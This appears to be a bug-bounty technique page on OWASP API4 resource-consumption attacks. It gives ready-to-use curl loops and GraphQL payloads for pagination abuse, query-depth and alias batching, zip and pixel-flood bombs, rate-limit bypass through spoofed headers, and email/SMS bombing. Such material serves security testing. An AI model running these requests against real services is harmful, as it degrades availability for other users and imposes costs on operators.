---
id: "api-resource-consumption"
title: "Unrestricted Resource Consumption - API DoS & Abuse"
type: "technique"
category: "api-security"
subcategory: "rate-limiting"
tags: ["api", "dos", "rate-limiting", "pagination", "owasp-api-top-10", "resource-consumption", "graphql", "bug-bounty"]
platforms: ["linux", "macos", "windows"]
related: ["bfla-authorization-testing", "shadow-zombie-api", "webhook-security"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# Unrestricted Resource Consumption (OWASP API4:2023)

## Overview

APIs that fail to enforce limits on CPU, memory, bandwidth, or processing time per consumer are vulnerable to denial-of-service and economic abuse. This goes beyond simple rate limiting -- a single expensive request can exhaust resources even within rate limits.

**Bug bounty context**: These findings are typically Medium severity but can be High if they cause actual service degradation, financial impact (cloud billing), or can be chained with other vulns.

## Attack Vectors

### 1. Pagination Abuse

```bash
# Default pagination - check if size/limit is enforced
curl "https://api.target.com/api/users?page=1&size=10"        # Normal
curl "https://api.target.com/api/users?page=1&size=999999"     # Abuse
curl "https://api.target.com/api/users?page=1&limit=200000"    # Alt param
curl "https://api.target.com/api/users?page=1&per_page=100000" # Alt param
curl "https://api.target.com/api/users?offset=0&count=999999"  # Alt param

# Negative/zero values
curl "https://api.target.com/api/users?page=-1&size=100"
curl "https://api.target.com/api/users?page=0&size=0"

# Deep pagination (forces DB to scan many rows)
curl "https://api.target.com/api/users?page=999999&size=100"
```

### 2. Expensive Search/Filter Queries

```bash
# Wildcard/regex searches that cause table scans
curl "https://api.target.com/api/search?q=*"
curl "https://api.target.com/api/search?q=.*"
curl "https://api.target.com/api/search?q=%25%25%25%25"  # %%%% SQL wildcards
curl "https://api.target.com/api/users?filter=name+LIKE+'%25a%25'"

# Complex filter combinations
curl "https://api.target.com/api/items?filter[name]=*&filter[desc]=*&sort=name,desc,created,updated"

# Nested includes/expands (N+1 query amplification)
curl "https://api.target.com/api/users?include=posts,posts.comments,posts.comments.author,posts.likes"
curl "https://api.target.com/api/users?expand=all"
```

### 3. GraphQL-Specific Attacks

```graphql
# Deep nesting (query depth attack)
query {
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
              email
            }
          }
        }
      }
    }
  }
}

# Alias-based batching (bypass per-query rate limits)
query {
  a1: user(id: "1") { email }
  a2: user(id: "2") { email }
  a3: user(id: "3") { email }
  # ... repeat 1000 times
  a1000: user(id: "1000") { email }
}

# Fragment-based amplification
query {
  users {
    ...F1
    ...F2
    ...F3
  }
}
fragment F1 on User { posts { comments { author { posts { title } } } } }
fragment F2 on User { posts { comments { author { posts { title } } } } }
fragment F3 on User { posts { comments { author { posts { title } } } } }

# Introspection abuse (full schema dump)
query { __schema { types { name fields { name type { name } } } } }
```

### 4. File Upload Abuse

```bash
# Oversized file upload
dd if=/dev/zero of=huge.bin bs=1M count=1024
curl -X POST https://api.target.com/api/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@huge.bin"

# Many small files (exhaust storage/inodes)
for i in $(seq 1 10000); do
  curl -X POST https://api.target.com/api/upload \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@small.txt" &
done

# Zip bomb
# Create a 42.zip-style nested archive
curl -X POST https://api.target.com/api/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@zipbomb.zip"

# Image processing abuse (decompression bomb)
# Create a small PNG that decompresses to massive dimensions
# pixel flood: 1-pixel PNG that claims to be 65535x65535
curl -X POST https://api.target.com/api/avatar \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@pixel_flood.png"
```

### 5. Report/Export Generation

```bash
# Trigger expensive report generation
curl -X POST https://api.target.com/api/reports/generate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"date_range": "2000-01-01:2026-12-31", "include_all": true}'

# CSV/PDF export of entire database
curl -X POST https://api.target.com/api/export/users \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"format": "csv", "filters": {}}'

# Multiple concurrent exports
for i in $(seq 1 50); do
  curl -X POST https://api.target.com/api/reports/generate \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"type": "full_audit"}' &
done
```

### 6. Rate Limiting Bypass

```bash
# IP rotation (if rate limit is per-IP)
# Use different X-Forwarded-For values
curl -H "X-Forwarded-For: 1.2.3.4" https://api.target.com/api/endpoint
curl -H "X-Forwarded-For: 5.6.7.8" https://api.target.com/api/endpoint

# Other header variations
curl -H "X-Real-IP: 1.2.3.4" https://api.target.com/api/endpoint
curl -H "X-Client-IP: 1.2.3.4" https://api.target.com/api/endpoint
curl -H "X-Originating-IP: 1.2.3.4" https://api.target.com/api/endpoint
curl -H "True-Client-IP: 1.2.3.4" https://api.target.com/api/endpoint

# API versioning bypass
curl https://api.target.com/v1/endpoint  # Rate limited
curl https://api.target.com/v2/endpoint  # Not rate limited?

# Different auth bypass
curl https://api.target.com/api/endpoint  # API key rate limited
curl https://api.target.com/api/endpoint -H "Authorization: Bearer $JWT"  # JWT not limited?

# Casing/encoding bypass
curl https://api.target.com/API/endpoint
curl https://api.target.com/api/Endpoint
curl https://api.target.com/api/endpoint%00
curl https://api.target.com/api/endpoint/
curl https://api.target.com/api/endpoint?
```

### 7. Batch/Bulk Endpoint Abuse

```bash
# If batch endpoints exist, test limits
curl -X POST https://api.target.com/api/batch \
  -H "Content-Type: application/json" \
  -d '{"operations": [
    {"method": "GET", "url": "/api/users/1"},
    {"method": "GET", "url": "/api/users/2"},
    ... # 10000 operations
  ]}'

# Bulk create/update
curl -X POST https://api.target.com/api/items/bulk \
  -H "Content-Type: application/json" \
  -d '{"items": [/* 100000 items */]}'
```

### 8. Email/SMS/Notification Abuse

```bash
# Trigger expensive notifications repeatedly
curl -X POST https://api.target.com/api/password-reset \
  -d '{"email": "victim@target.com"}'
# Repeat rapidly - financial cost of SMS/email

# Invitation spam
curl -X POST https://api.target.com/api/invite \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"emails": ["a@b.com", "c@d.com", ...]}'  # 10000 emails
```

## Testing Checklist

```
- [ ] Test all list endpoints with size/limit=999999
- [ ] Test deep pagination (page=999999)
- [ ] Test search endpoints with wildcard queries
- [ ] Test GraphQL query depth and alias batching
- [ ] Test file upload size limits
- [ ] Test report/export generation with large date ranges
- [ ] Measure response times for normal vs. abusive requests
- [ ] Test rate limiting bypass via headers/encoding
- [ ] Test batch endpoint operation limits
- [ ] Test notification endpoints for abuse (email/SMS bombing)
- [ ] Check for missing timeout on long-running operations
- [ ] Test concurrent requests to same expensive endpoint
```

## Impact Demonstration

```
To prove impact for bug bounty, show:
1. Response time comparison: normal (200ms) vs. abusive (30s+)
2. Server CPU/memory spike if visible (error pages, 503s)
3. Financial impact: cloud cost calculation for abusive requests
4. Data volume: show how much data can be exfiltrated via pagination
5. Service degradation affecting other users
```

## Tools
- **Burp Suite Intruder** — Rate limit testing, parameter fuzzing
- **ffuf** — Endpoint fuzzing with various parameters
- **graphql-cop** — GraphQL security auditing
- **InQL** — Burp extension for GraphQL
- **vegeta** — HTTP load testing
- **slowhttptest** — Slow HTTP DoS testing
- **wfuzz** — Web fuzzing for parameter abuse
